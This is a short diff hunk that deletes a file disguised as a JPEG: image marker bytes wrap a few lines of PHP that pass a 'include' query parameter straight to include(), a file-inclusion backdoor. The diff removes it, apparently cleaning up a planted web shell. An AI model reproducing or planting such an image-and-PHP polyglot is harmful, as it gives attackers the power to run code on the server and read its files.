@@ -1,6 +1,0 @@
-ÿØÿàÿÐ<?php
-$filÿÑe = $_GET[ÿÒ'include']ÿÓ ?? '';
-ifÿÔ($file) {
-ÿÕ    includÿÖe($file);
-ÿ×}
-?>ÿÙ
